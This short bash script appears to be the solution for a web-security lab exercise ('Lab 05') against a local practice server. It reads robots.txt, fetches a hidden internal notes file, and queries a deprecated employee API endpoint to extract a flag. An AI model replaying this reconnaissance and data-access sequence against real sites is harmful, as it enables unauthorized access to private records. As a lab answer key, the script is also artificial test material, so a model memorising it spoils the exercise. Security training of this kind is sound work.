#!/usr/bin/env bash
# Lab 05 — robots.txt names the deprecated version; notes.md names the account.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9050}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab05

"$H5I" browser open "$URL/robots.txt" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --set path=/internal/notes.md >/dev/null
send "$SESSION" req_0 --set path=/api/v0/employee/1 | flag
